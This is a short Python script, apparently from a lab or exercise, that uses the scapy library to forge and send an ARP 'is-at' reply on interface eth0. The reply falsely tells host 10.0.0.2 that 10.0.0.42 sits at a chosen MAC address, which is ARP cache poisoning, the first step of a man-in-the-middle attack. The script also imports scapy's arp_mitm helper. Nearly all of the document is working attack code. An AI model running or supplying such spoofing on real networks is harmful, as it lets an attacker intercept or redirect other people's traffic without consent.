#!/usr/bin/env python3
from scapy.all import send, sendp, sniff, sr1, srp
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, arp_mitm, getmacbyip

target_mac = "42:42:42:42:42:42"
source_ip = "10.0.0.42"
target_ip = "10.0.0.2"

WHO_HAS = 1
IS_AT = 2

ether_layer = Ether(dst="42:42:42:42:42:42")
arp_layer = ARP(
    op=2, pdst=target_ip, hwdst="42:42:42:42:42:42", hwsrc=target_mac, psrc=source_ip
)

sendp(ether_layer / arp_layer, iface="eth0")
